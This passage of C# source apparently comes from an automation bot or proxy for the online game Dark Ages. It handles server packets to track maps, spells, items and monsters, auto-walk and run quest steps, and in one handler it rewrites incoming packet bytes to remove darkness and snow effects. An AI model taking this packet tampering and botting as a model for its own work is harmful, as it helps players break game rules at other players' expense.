        client.SendMessage("You are out of Leaf Keys", "red", false);
      else if (client.Inventory[num - 1] != null && client.Inventory[num - 1].Name == "Love Key" && !client.HasItem("Love Key"))
        client.SendMessage("You are out of Love Keys", "red", false);
      else if (client.Inventory[num - 1] != null && client.Inventory[num - 1].Name == "Red Key" && !client.HasItem("Red Key"))
        client.SendMessage("You are out of Red Keys", "red", false);
      else if (client.Inventory[num - 1] != null && client.Inventory[num - 1].Name == "Marble Key" && !client.HasItem("Marble Key"))
        client.SendMessage("You are out of Marble Keys", "red", false);
      if (num > 0)
        client.Inventory[num - 1] = (Item) null;
      return true;
    }

    public bool ServerMessage_0x11_CharacterTurn(Client client, ServerPacket msg)
    {
      uint key = msg.ReadUInt32();
      Direction direction = (Direction) msg.ReadByte();
      if ((int) key == (int) client.PlayerID)
      {
        client.ClientLocation.Direction = direction;
        client.ServerLocation.Direction = direction;
      }
      if (client.Characters.ContainsKey(key) && client.Characters[key] != null)
      {
        if (!client.Characters[key].Moved)
          client.Characters[key].Moved = true;
        client.Characters[key].LastAction = DateTime.UtcNow;
        client.Characters[key].Location.Direction = direction;
      }
      return true;
    }

    public bool ServerMessage_0x13_HpBar(Client client, ServerPacket msg)
    {
      uint key = msg.ReadUInt32();
      int num1 = (int) msg.ReadByte();
      byte num2 = msg.ReadByte();
      int num3 = (int) msg.ReadByte();
      if (client.Characters.ContainsKey(key) && Server.StaticCharacters.ContainsKey(key) && client.Characters[key] != null && Server.StaticCharacters[key] != null)
        Server.StaticCharacters[key].HpAmount = (double) num2;
      if (client.Characters.ContainsKey(key) && client.Characters[key] != null)
      {
        client.Characters[key].Lured = true;
        client.Characters[key].LastAction = DateTime.UtcNow;
        if (client.MainTarget != null && (int) client.MainTarget.ID == (int) key)
          client.follow_walk = 2;
      }
      if ((int) key == (int) client.getEntityACsID)
        client.UseSkill("Combat Senses", 0U);
      return true;
    }

    public bool ServerMessage_0x15_MapInfo(Client client, ServerPacket msg)
    {
      string str = string.Empty;
      if (client.MapInfo.Number != int.MinValue)
        client.lastmapnum = client.MapInfo.Number;
      if (client.MapInfo.Name != null)
        str = client.MapInfo.Name;
      client.Towns.Clear();
      client.MapInfo.Number = (int) msg.ReadUInt16();
      client.MapInfo.Width = (int) msg.ReadByte();
      client.MapInfo.Height = (int) msg.ReadByte();
      client.MapInfo.Bitmask = msg.ReadByte();
      int num1 = (int) msg.ReadByte();
      int num2 = (int) msg.ReadByte();
      client.MapInfo.Checksum = msg.ReadUInt16();
      client.MapInfo.Name = msg.ReadString((int) msg.ReadByte());
      if (client.MapInfo.Number == 435 && Server.StaticCharacters.ContainsKey(client.PlayerID))
      {
        client.IsSkulled = false;
        Server.SkullList.Remove(client.Name);
        Server.StaticCharacters[client.PlayerID].IsSkulled = false;
      }
      if (client.MapInfo.Number == 511)
        client.RequestGroupList();
      if (str.Contains("Training Dojo") && !client.MapInfo.Name.Contains("Training Dojo") && !client.Tab.dojo.Checked)
      {
        client.pause = true;
        client.Tab.btnPlay.Enabled = true;
        client.Tab.btnStop.Enabled = false;
      }
      if (str.Contains("Training Dojo") && !client.MapInfo.Name.Contains("Training Dojo") && client.Tab.dojo.Checked)
      {
        client.Tab.autowalker_locales.SelectedItem = (object) "Mehadi";
        client.Tab.walklocaleslist.SelectedItem = (object) "Entrance";
        client.Tab.autowalker_button.Text = "Stop";
        client.autowalkon = true;
        if (!client.BotThread.IsAlive)
          client.BotThread.Start();
        client.pause = false;
        client.Tab.btnPlay.Enabled = false;
        client.Tab.btnStop.Enabled = true;
      }
      lock (client.Characters)
      {
        foreach (Character character in client.Characters.Values.ToArray<Character>())
        {
          if (character != null && (int) character.ID != (int) client.PlayerID)
            character.IsOnScreen = false;
        }
      }
      client.MapInfo.Initialize();
      int num3 = !(client.MapInfo.Name != "Prairie Circuit") ? 1 : (!client.CantSpellMaps.Contains(client.MapInfo.Number) ? 1 : 0);
      client.spellmap = num3 != 0;
      client.skillmap = !client.CantSkillMaps.Contains(client.MapInfo.Number);
      if (!client.safemode && (client.MapInfo.Bitmask == (byte) 3 || client.MapInfo.Bitmask == (byte) 64))
        msg.BodyData[4] = (byte) 0;
      if (client.Tab.disablesnow.Checked && client.MapInfo.Bitmask == (byte) 1)
        msg.BodyData[4] = (byte) 0;
      return true;
    }

    public bool ServerMessage_0x17_AddSpell(Client client, ServerPacket msg)
    {
      Spell spell = new Spell();
      spell.SpellSlot = (int) msg.ReadByte();
      spell.Icon = (int) msg.ReadUInt16();
      spell.Type = (int) msg.ReadByte();
      spell.Name = msg.ReadString((int) msg.ReadByte());
      spell.Prompt = msg.ReadString((int) msg.ReadByte());
      spell.CastLines = (int) msg.ReadByte();
      Match match = Regex.Match(spell.Name, "(.*?)( \\(Lev:)(\\d+)(\\/)(\\d+)(\\))");
      if (match.Success)
      {
        spell.Name = match.Groups[1].Value;
        spell.CurrentLevel = int.Parse(match.Groups[3].Value);
        spell.MaximumLevel = int.Parse(match.Groups[5].Value);
      }
      if (System.IO.File.Exists(Options.DarkAgesDirectoryName + "\\" + client.Name + "\\SpellBook.cfg"))
      {
        StreamReader streamReader = new StreamReader((Stream) System.IO.File.Open(Options.DarkAgesDirectoryName + "\\" + client.Name + "\\SpellBook.cfg", FileMode.Open, FileAccess.Read, FileShare.Read));
        while (!streamReader.EndOfStream)
        {
          if (streamReader.ReadLine().Equals(spell.Name, StringComparison.CurrentCultureIgnoreCase))
          {
            for (int index = 0; index < spell.Captions.Length; ++index)
              spell.Captions[index] = streamReader.ReadLine().Split(':')[1];
          }
        }
        streamReader.Close();
      }
      client.SpellBook[spell.SpellSlot - 1] = spell;
      if (spell.Name.Contains("Prayer"))
        client.PrayerSpell = spell.Name;
      if (spell.Name != "nis" && spell.Name != "Learning Spell")
      {
        if (client.Tab.MacroOptions.macrospellslistview.Items.ContainsKey(spell.Name) && client.Tab.MacroOptions.macrospellslistview.Items[spell.Name] != null && spell.CurrentLevel < int.Parse(client.Tab.MacroOptions.macrospellslistview.Items[spell.Name].SubItems[2].Text))
        {
          client.Tab.MacroOptions.macrospellslistview.Items[spell.Name].SubItems[1].Text = spell.CurrentLevel.ToString();
          client.SaveMacroList();
        }
        else if (client.Tab.MacroOptions.macrospellslistview.Items.ContainsKey(spell.Name) && client.Tab.MacroOptions.macrospellslistview.Items[spell.Name] != null && spell.CurrentLevel >= int.Parse(client.Tab.MacroOptions.macrospellslistview.Items[spell.Name].SubItems[2].Text))
        {
          client.Tab.MacroOptions.macrospellslistview.Items[spell.Name].Remove();
          client.SaveMacroList();
        }
      }
      if (client.Tab.SkillSwap.spelltemlist.Items.ContainsKey(spell.SpellSlot.ToString()))
      {
        if (client.Tab.SkillSwap.spelltemlist.Items[spell.SpellSlot.ToString()].SubItems.Count > 1)
          client.Tab.SkillSwap.spelltemlist.Items[spell.SpellSlot.ToString()].SubItems[1].Text = spell.Name;
        else
          client.Tab.SkillSwap.spelltemlist.Items[spell.SpellSlot.ToString()].SubItems.Add(spell.Name);
      }
      else if (spell.SpellSlot > 36 && client.Tab.SkillSwap.spellmedlist.Items.ContainsKey((spell.SpellSlot - 36).ToString()))
      {
        ListView.ListViewItemCollection items1 = client.Tab.SkillSwap.spellmedlist.Items;
        int num = spell.SpellSlot - 36;
        string index1 = num.ToString();
        if (items1[index1].SubItems.Count > 1)
        {
          ListView.ListViewItemCollection items2 = client.Tab.SkillSwap.spellmedlist.Items;
          num = spell.SpellSlot - 36;
          string index2 = num.ToString();
          items2[index2].SubItems[1].Text = spell.Name;
        }
        else
        {
          ListView.ListViewItemCollection items2 = client.Tab.SkillSwap.spellmedlist.Items;
          num = spell.SpellSlot - 36;
          string index2 = num.ToString();
          items2[index2].SubItems.Add(spell.Name);
        }
      }
      return true;
    }

    public bool ServerMessage_0x18_RemoveSpell(Client client, ServerPacket msg)
    {
      int num1 = (int) msg.ReadByte();
      if (num1 > 0)
        client.SpellBook[num1 - 1] = (Spell) null;
      if (client.Tab.SkillSwap.spelltemlist.Items.ContainsKey(num1.ToString()))
      {
        if (client.Tab.SkillSwap.spelltemlist.Items[num1.ToString()].SubItems.Count > 1)
          client.Tab.SkillSwap.spelltemlist.Items[num1.ToString()].SubItems[1].Text = "";
      }
      else
      {
        int num2;
        int num3;
        if (num1 > 36)
        {
          ListView.ListViewItemCollection items = client.Tab.SkillSwap.spellmedlist.Items;
          num2 = num1 - 36;
          string key = num2.ToString();
          num3 = !items.ContainsKey(key) ? 1 : 0;
        }
        else
          num3 = 1;
        if (num3 == 0)
        {
          ListView.ListViewItemCollection items1 = client.Tab.SkillSwap.spellmedlist.Items;
          num2 = num1 - 36;
          string index1 = num2.ToString();
          if (items1[index1].SubItems.Count > 1)
          {
            ListView.ListViewItemCollection items2 = client.Tab.SkillSwap.spellmedlist.Items;
            num2 = num1 - 36;
            string index2 = num2.ToString();
            items2[index2].SubItems[1].Text = "";
          }
        }
      }
      return true;
    }

    public bool ServerMessage_0x19_SoundEffect(Client client, ServerPacket msg)
    {
      if (msg.ReadByte() == byte.MaxValue)
      {
        if (client.anttunnels == 1)
        {
          client.anttunnel = DateTime.Now;
          client.SaveTimedStuff(23);
        }
        else if (client.guardiananttunnels == 1)
        {
          client.guardiananttunnel = DateTime.Now;
          client.SaveTimedStuff(24);
        }
      }
      return true;
    }

    public bool ServerMessage_0x1A_BodyAnimation(Client client, ServerPacket msg)
    {
      uint key = msg.ReadUInt32();
      if (client.Characters.ContainsKey(key) && client.Characters[key] != null)
      {
        if (!client.Characters[key].Moved)
          client.Characters[key].Moved = true;
        client.Characters[key].LastAction = DateTime.UtcNow;
      }
      return (client.safemode || !client.Tab.vdisableallbody || (int) key != (int) client.PlayerID) && !client.Tab.disableitemsnstuff.Checked;
    }

    public bool ServerMessage_0x1F_NewMap(Client client, ServerPacket msg)
    {
      client.tocpopup = false;
      client.IsSkulled = false;
      client.checkedtiles.Clear();
      foreach (MappedMaps mappedMaps in client.AutoWalkMaps.Values)
        mappedMaps.Deadend = false;
      client.CurAWDest = (Location) null;
      client.HasAWPath = false;
      if (client.Tab.recorditemdata.Checked && ((IEnumerable<Form>) Program.MainForm.ItemXMLEditor.MdiChildren).Count<Form>() > 0)
      {
        foreach (Form mdiChild in Program.MainForm.ItemXMLEditor.MdiChildren)
        {
          Form f = mdiChild;
          if (f != null && f is ItemMapXMLEditorChild && (f as ItemMapXMLEditorChild).charname != null && (f as ItemMapXMLEditorChild).charname.Text == client.Name)
            Program.MainForm.BeginInvoke((Action) (() =>
            {
              if (client.Tab.all5classes.Checked)
                (f as ItemMapXMLEditorChild).Save(client.Name, true);
              else
                (f as ItemMapXMLEditorChild).Save(client.Name, false);
            }));
        }
      }
      if (client.ytquest == 15 && client.MapInfo.Number == 8349 && client.HasItem("Yowien Fishing Pole"))
      {
        client.Assail();
        client.UseItem("Yowien Fishing Pole");
        client.SendMessage("Search for house key when you get to YT12", (byte) 0, false);
      }
      client.newmapdelay = DateTime.UtcNow;
      client.ignorewaitatdoors = true;
      MapNum mapNum = new MapNum();
      mapNum.Number = client.MapInfo.Number;
      if (!client.TempRegions.ContainsKey(client.MapInfo.Number))
        client.TempRegions.Add(client.MapInfo.Number, mapNum);
      client.Tab.Wayregion.map.Text = client.MapInfo.Number.ToString() + " - " + client.MapInfo.Name;
      client.randomdest = (Location) null;
      client.Previous.Clear();
      if (!client.LastPermMessage.Contains("You are blind") && !client.LastPermMessage.Contains("You have Gifts!") && (!client.MapInfo.Name.Contains("Water Dungeon") && !client.MapInfo.Name.Contains("Veltain Mine")) && (!client.MapInfo.Name.Contains("Canal") && !client.MapInfo.Name.Equals("Yowien Territory12") && (!client.MapInfo.Name.Equals("Yowien Territory13") && !client.MapInfo.Name.Equals("Yowien Territory14"))) && (!client.MapInfo.Name.Equals("Yowien Territory24") && client.MapInfo.Number != 8308) && !client.MapInfo.Name.Equals("Balanced Arena"))
        client.SendMessage("", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 15") || client.MapInfo.Name.Equals("Veltain Mine 1") || (client.MapInfo.Name.Equals("Veltain Mine 5") || client.MapInfo.Name.Equals("Veltain Mine 6")) || client.MapInfo.Name.Equals("Veltain Mine 7") || client.MapInfo.Number == 7403)
        client.SendMessage("", (byte) 18, false);
      if (client.MapInfo.Number == 2141 && client.Tab.pigwalk.Checked && !client.Tab.wayregionson.Checked)
      {
        client.Tab.Wayregion.LoadMapPack(Program.StartupPath + "\\Settings\\MapPacks\\pigmaze.xml");
        client.Tab.actonlyinmobs.Checked = true;
        client.Tab.wayregionson.Checked = true;
      }
      if (client.MapInfo.Name == "Mount Giragan 1" || client.MapInfo.Name == "Mount Giragan 2" || client.MapInfo.Name == "Mount Giragan 3")
      {
        if (client.HasItem("Cedar Log"))
          client.cedarlogs = client.ItemAmount("Cedar Log");
        if (client.HasItem("Fir Log"))
          client.firlogs = client.ItemAmount("Fir Log");
        client.yulelogcount = "{=bC " + client.cedarlogs.ToString() + ", F " + client.firlogs.ToString();
        client.SendMessage(client.yulelogcount, (byte) 18, false);
      }
      if (client.HasItem("Yule Log") && client.HasItem("fior srad"))
      {
        if ((client.MapInfo.Number == 3079 || client.MapInfo.Number == 3006 || client.MapInfo.Number == 500) && !client.yulemileth)
        {
          client.Tab.autowalker_locales.Text = "Mileth";
          client.Tab.walklocaleslist.SelectedItem = (object) "Inn";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
          client.Tab.fastwalk.Checked = true;
          client.pause = false;
          client.Tab.btnPlay.Enabled = false;
          client.Tab.btnStop.Enabled = true;
        }
        if (client.MapInfo.Number == 502 && !client.yuleabel)
        {
          client.Tab.autowalker_locales.Text = "Abel";
          client.Tab.walklocaleslist.SelectedItem = (object) "Inn";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
          client.Tab.fastwalk.Checked = true;
          client.pause = false;
          client.Tab.btnPlay.Enabled = false;
          client.Tab.btnStop.Enabled = true;
        }
        if ((client.MapInfo.Number == 3020 || client.MapInfo.Number == 501) && !client.yulepiet)
        {
          client.Tab.autowalker_locales.Text = "Piet";
          client.Tab.walklocaleslist.SelectedItem = (object) "Inn";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
          client.Tab.fastwalk.Checked = true;
          client.pause = false;
          client.Tab.btnPlay.Enabled = false;
          client.Tab.btnStop.Enabled = true;
        }
        if ((client.MapInfo.Number == 3081 || client.MapInfo.Number == 505) && !client.yuleruc)
        {
          client.Tab.autowalker_locales.Text = "Rucesion";
          client.Tab.walklocaleslist.SelectedItem = (object) "Inn";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
          client.Tab.fastwalk.Checked = true;
          client.pause = false;
          client.Tab.btnPlay.Enabled = false;
          client.Tab.btnStop.Enabled = true;
        }
        if (client.MapInfo.Number == 662 && !client.yuletagor)
        {
          client.Tab.autowalker_locales.Text = "Tagor";
          client.Tab.walklocaleslist.SelectedItem = (object) "Inn";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
          client.Tab.fastwalk.Checked = true;
          client.pause = false;
          client.Tab.btnPlay.Enabled = false;
          client.Tab.btnStop.Enabled = true;
        }
        if ((client.MapInfo.Number == 503 || client.MapInfo.Number == 3016) && !client.yulesuomi)
        {
          client.Tab.autowalker_locales.Text = "Suomi";
          client.Tab.walklocaleslist.SelectedItem = (object) "Inn";
          client.Tab.autowalker_button.Text = "Stop";
          client.autowalkon = true;
          client.Tab.fastwalk.Checked = true;
          client.pause = false;
          client.Tab.btnPlay.Enabled = false;
          client.Tab.btnStop.Enabled = true;
        }
      }
      if (client.MapInfo.Number == 7401 && (client.previousmap == 7412 || client.previousmap == 7413))
        client.SaveTimedStuff(1);
      if (client.MapInfo.Number == 7401 && client.previousmap == 7405)
        client.SaveTimedStuff(2);
      if (client.MapInfo.Number == 7431 && client.previousmap == 7432)
        client.SaveTimedStuff(3);
      if (client.MapInfo.Number == 7433 && client.previousmap == 7403)
        client.SaveTimedStuff(4);
      if (client.MapInfo.Number == 7401 && client.previousmap == 7436)
        client.SaveTimedStuff(5);
      if (client.MapInfo.Number == 2901 && client.previousmap == 2905)
        client.SaveTimedStuff(6);
      if (client.MapInfo.Number == 2901 && client.previousmap == 2906)
        client.SaveTimedStuff(7);
      if (client.MapInfo.Number == 2901 && client.previousmap == 2907)
        client.SaveTimedStuff(8);
      if (client.MapInfo.Number == 10038 && client.previousmap == 10240)
      {
        client.SaveTimedStuff(9);
        client.pause = true;
        client.Tab.btnPlay.Enabled = true;
        client.Tab.btnStop.Enabled = false;
      }
      if (client.MapInfo.Name == "Road to House Macabre" && client.previousmapname.Contains("Macabre Grave Yard"))
      {
        client.pause = true;
        client.Tab.btnPlay.Enabled = true;
        client.Tab.btnStop.Enabled = false;
      }
      client.previousmap = client.MapInfo.Number;
      if (client.MapInfo.Number == 8997)
      {
        foreach (Item obj in client.Inventory)
        {
          if (obj != null)
          {
            if ((int) obj.Icon - 32768 == 8135)
              client.bug35 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8136)
              client.bug36 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8137)
              client.bug37 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8138)
              client.bug38 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8139)
              client.bug39 = obj.Amount;
          }
        }
        client.bugcount = client.bug35.ToString() + " - " + client.bug36.ToString() + " - " + client.bug37.ToString() + " - " + client.bug38.ToString() + " - " + client.bug39.ToString();
        client.SendMessage(client.bugcount, (byte) 18, false);
      }
      if (client.MapInfo.Number == 8996)
      {
        foreach (Item obj in client.Inventory)
        {
          if (obj != null)
          {
            if ((int) obj.Icon - 32768 == 8140)
              client.bug40 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8141)
              client.bug41 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8142)
              client.bug42 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8143)
              client.bug43 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8144)
              client.bug44 = obj.Amount;
          }
        }
        client.bugcount = client.bug40.ToString() + " - " + client.bug41.ToString() + " - " + client.bug42.ToString() + " - " + client.bug43.ToString() + " - " + client.bug44.ToString();
        client.SendMessage(client.bugcount, (byte) 18, false);
      }
      if (client.MapInfo.Number == 8999)
      {
        foreach (Item obj in client.Inventory)
        {
          if (obj != null)
          {
            if ((int) obj.Icon - 32768 == 8125)
              client.bug25 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8126)
              client.bug26 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8127)
              client.bug27 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8128)
              client.bug28 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8129)
              client.bug29 = obj.Amount;
          }
        }
        client.bugcount = client.bug25.ToString() + " - " + client.bug26.ToString() + " - " + client.bug27.ToString() + " - " + client.bug28.ToString() + " - " + client.bug29.ToString();
        client.SendMessage(client.bugcount, (byte) 18, false);
      }
      if (client.MapInfo.Number == 8998)
      {
        foreach (Item obj in client.Inventory)
        {
          if (obj != null)
          {
            if ((int) obj.Icon - 32768 == 8130)
              client.bug30 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8131)
              client.bug31 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8132)
              client.bug32 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8133)
              client.bug33 = obj.Amount;
            else if ((int) obj.Icon - 32768 == 8134)
              client.bug34 = obj.Amount;
          }
        }
        client.bugcount = client.bug30.ToString() + " - " + client.bug31.ToString() + " - " + client.bug32.ToString() + " - " + client.bug33.ToString() + " - " + client.bug34.ToString();
        client.SendMessage(client.bugcount, (byte) 18, false);
      }
      if (client.MapInfo.Name.Equals("Yowien Territory25"))
        client.CountedMonsters[892] = 0;
      if (client.MapInfo.Number == 7412 || client.MapInfo.Number == 7403 || (client.MapInfo.Number == 7432 || client.MapInfo.Number == 7436) || client.MapInfo.Number == 7405)
      {
        client.CountedMonsters[335] = 0;
        client.CountedMonsters[334] = 0;
        client.CountedMonsters[625] = 0;
        client.CountedMonsters[395] = 0;
        client.CountedMonsters[396] = 0;
        client.CountedMonsters[86] = 0;
        client.CountedMonsters[410] = 0;
        client.CountedMonsters[512] = 0;
        client.CountedMonsters[490] = 0;
        client.SendMessage("", (byte) 18, false);
      }
      if (client.MapInfo.Number == 7401)
        client.SendMessage("{=uRats 0", (byte) 18, false);
      if (client.MapInfo.Number == 7414)
        client.SendMessage("{=uBlobs 0", (byte) 18, false);
      if (client.MapInfo.Number == 7431)
        client.SendMessage("{=uBlobs 0", (byte) 18, false);
      if (client.MapInfo.Number == 7433)
        client.SendMessage("{=uBlobs 0", (byte) 18, false);
      if (client.MapInfo.Number == 7425)
        client.SendMessage("{=uPirates 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Veltain Mine 2") || client.MapInfo.Name.Equals("Veltain Mine 3") || client.MapInfo.Name.Equals("Veltain Mine 4"))
      {
        client.CountedMonsters[8] = 0;
        client.CountedMonsters[10] = 0;
        client.CountedMonsters[9] = 0;
        client.CountedMonsters[680] = 0;
        client.CountedMonsters[682] = 0;
        client.CountedMonsters[681] = 0;
        client.CountedMonsters[683] = 0;
        client.CountedMonsters[685] = 0;
        client.CountedMonsters[684] = 0;
        client.SendMessage("{=qS 0, G 0, W 0", (byte) 18, false);
      }
      if (client.MapInfo.Name.Contains("Water Dungeon"))
      {
        client.CountedMonsters[703] = 0;
        client.CountedMonsters[704] = 0;
        client.CountedMonsters[705] = 0;
        client.CountedMonsters[706] = 0;
        client.CountedMonsters[715] = 0;
        client.CountedMonsters[716] = 0;
      }
      if (client.MapInfo.Name.Equals("Water Dungeon 1"))
        client.SendMessage("{=bB 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 2"))
        client.SendMessage("{=bB 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 3"))
        client.SendMessage("{=bF 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 4"))
        client.SendMessage("{=bB 0, F 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 5"))
        client.SendMessage("{=bB 0, Si 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 6"))
        client.SendMessage("{=bB 0, F 0, Si 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 7"))
        client.SendMessage("{=bF 0, Si 0, R 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 8"))
        client.SendMessage("{=bF 0, Si 0, R 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 9"))
        client.SendMessage("{=bSq 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 10"))
        client.SendMessage("{=bSi 0, R 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 11"))
        client.SendMessage("{=bSi 0, R 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 12"))
        client.SendMessage("{=bSi 0, R 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 13"))
        client.SendMessage("{=bE 0", (byte) 18, false);
      if (client.MapInfo.Name.Equals("Water Dungeon 14"))
        client.SendMessage("{=bSi 0, R 0, Sq 0, E 0", (byte) 18, false);
      return true;
    }

    public bool ServerMessage_0x29_SpellAnimation(Client client, ServerPacket msg)
    {
      ushort num1 = 0;
      uint key1 = 0;
      uint key2 = msg.ReadUInt32();
      ushort num2;
      ushort num3;
      if (key2 != 0U)
      {
        key1 = msg.ReadUInt32();
        num2 = msg.ReadUInt16();
        num1 = msg.ReadUInt16();
        num3 = msg.ReadUInt16();
      }
      else
      {
        num2 = msg.ReadUInt16();
        num3 = msg.ReadUInt16();
        msg.ReadUInt16();
        msg.ReadUInt16();
        int num4 = (int) msg.ReadByte();
      }
      if (client.Characters.ContainsKey(key1) && client.Characters[key1] is Player && (client.Characters.ContainsKey(key2) && client.Characters[key2] is Npc) && Server.StaticCharacters.ContainsKey(key2))
      {
        if ((int) key1 == (int) client.PlayerID && (num2 == (ushort) 254 || num2 == (ushort) 137))
        {
          if (!Server.StaticCharacters[key2].hasdion && !Server.StaticCharacters[key2].hasmonsterdion && Server.StaticCharacters[key2].hascurse)
            ++client.Characters[key2].HitCount;
          if ((Decimal) client.Characters[key2].HitCount >= client.Tab.brieshits.Value)
          {
            client.Characters[key2].HitCount = 0UL;
            Server.StaticCharacters[key2].CantAttack = true;
          }
        }
        if (num2 == (ushort) 25)
          Server.StaticCharacters[key2].CantAttack = false;
      }
      if ((num2 == (ushort) 21 || num2 == (ushort) 22) && ((int) key2 == (int) client.PlayerID && client.MapInfo.Number == 421) && (!client.Tab.vimpskillbutton && Program.MainForm.laborname.Text != string.Empty && Program.MainForm.getmentored.Checked) && Program.MainForm.laborname.Text.ToLower() != client.Name.ToLower())
      {
        client.SaveTimedStuff(34);
        client.LogOff();
      }
      if (num2 == (ushort) 3 && (int) key2 == (int) client.PlayerID && client.Tab.vautowalker_locales.Equals("Aman Jungle"))
      {
        if (client.ytquest == 1)
          client.YTQuestStep("YT 3");
        if (client.ytquest == 2)
          client.YTQuestStep("CC 7");
        if (client.ytquest == 3)
          client.YTQuestStep("YT 3");
        if (client.ytquest == 4)
          client.YTQuestStep("CC 7");
        if (client.ytquest == 5)
          client.YTQuestStep("YT 6");
        if (client.ytquest == 7)
          client.YTQuestStep("CC 7");
        if (client.ytquest == 8)
          client.YTQuestStep("YT 3");
        if (client.ytquest == 9)
          client.YTQuestStep("CC 7");
        if (client.ytquest == 10)
        {
          if (client.HasItem("Crystal Orb"))
            client.YTQuestStep("YT 11");
          else
            client.SendMessage("Get a Crystal Orb and fresh hide!", "red", false);
        }
        if (client.ytquest == 15)
        {
          if (client.MapInfo.Number == 8349 && client.HasItem("Yowien Fishing Pole") && client.ServerLocation.Y > 3)
          {
            client.Assail();
            client.UseItem("Yowien Fishing Pole");
          }
          else
            client.YTQuestStep("YT 12");
        }
        if (client.ytquest == 70)
        {
          if (client.ItemAmount("Dendron Flower") >= 20U)
            client.YTQuestStep("YT 6");
          else
            client.SendMessage("Get more Dendron Flowers and fresh hide!", "red", false);
        }
      }
      if (client.Characters.ContainsKey(key1) && client.Characters[key1] != null)
      {
        client.Characters[key1].LastAction = DateTime.UtcNow;
        if (!client.Characters[key1].Moved)
          client.Characters[key1].Moved = true;
      }
      if (client.Characters.ContainsKey(key2) && client.Characters[key2] != null)
        client.Characters[key2].LastAction = DateTime.UtcNow;
      lock (Server.StaticCharacters)
      {
        if (client.Characters.ContainsKey(key2) && Server.StaticCharacters.ContainsKey(key2) && client.Characters[key2] != null && Server.StaticCharacters[key2] != null)
        {
          if (client.LastSpell == "asgall faileas" && (int) key2 == (int) client.PlayerID && (num2 == (ushort) 66 || num1 == (ushort) 66))
            client.asgalltime = DateTime.UtcNow;
          if (client.Tab.MonstersByPlayer != null && (int) key1 == (int) client.playeridformonster)
            client.trackedmonsterID = key2;
          if (!Server.StaticCharacters[key2].SpellAnimationHistory.ContainsKey((int) num2))
            Server.StaticCharacters[key2].SpellAnimationHistory.Add((int) num2, DateTime.UtcNow);
          else
            Server.StaticCharacters[key2].SpellAnimationHistory[(int) num2] = DateTime.UtcNow;
          if ((int) key1 == (int) client.PlayerID && client.LastSpell != string.Empty)
          {
            if (!Server.StaticCharacters[key2].ProbableSpellType.ContainsKey((int) num2))
              Server.StaticCharacters[key2].ProbableSpellType.Add((int) num2, client.LastSpell);
            else
              Server.StaticCharacters[key2].ProbableSpellType[(int) num2] = client.LastSpell;
            if (num1 == (ushort) 192)
              client.cttime = DateTime.UtcNow;
          }
          if (client.Characters.ContainsKey(key1) && Server.StaticCharacters.ContainsKey(key1) && client.Characters[key1] != null && Server.StaticCharacters[key1] != null)
          {
            if (num2 == (ushort) 84 && client.altsneedflowered.Count > 0 && Server.StaticCharacters[key2].Name == client.altsneedflowered[0])
              client.altsneedflowered.Remove(Server.StaticCharacters[key2].Name);
            if (num2 == (ushort) 84 && Server.StaticCharacters[key2].wantsflowered)
              Server.StaticCharacters[key2].wantsflowered = false;
            if ((int) key1 == (int) client.PlayerID && num2 != (ushort) 33 && (num2 != (ushort) 32 && num2 != (ushort) 40) && (num2 != (ushort) 117 && num2 != (ushort) 257 && (num2 != (ushort) 259 && num2 != (ushort) 104)) && (num2 != (ushort) 243 && num2 != (ushort) 258 && num2 != (ushort) 82) && num2 != (ushort) 273)
            {
              client.Characters[key2].Lured = true;
              if (client.MainTarget != null && (int) client.MainTarget.ID == (int) key2)
                client.follow_walk = 2;
            }
            if (num2 != (ushort) 33 && num2 != (ushort) 32 && (num2 != (ushort) 40 && num2 != (ushort) 117) && (num2 != (ushort) 257 && num2 != (ushort) 259 && (num2 != (ushort) 104 && num2 != (ushort) 243)) && (num2 != (ushort) 258 && num2 != (ushort) 82 && num2 != (ushort) 273) && num2 != (ushort) 235)
              client.Characters[key2].LastHitByID = key1;
            if ((int) key1 == (int) client.PlayerID && (num2 == (ushort) 25 || num2 == (ushort) 274))
              client.Characters[key2].LastHitByID = 0U;
            if (Server.StaticCharacters[key1] is Npc && Server.StaticCharacters[key2] is Player && !Server.StaticCharacters[key2].AnimationFrom.ContainsKey((int) num2))
              Server.StaticCharacters[key2].AnimationFrom.Add((int) num2, (Server.StaticCharacters[key1] as Npc).Image);
            if (Server.StaticCharacters[key1] is Player && num2 == (ushort) 48)
            {
              if (!Server.StaticCharacters[key1].SpellAnimationHistory.ContainsKey((int) num2))
                Server.StaticCharacters[key1].SpellAnimationHistory.Add((int) num2, DateTime.UtcNow);
              else
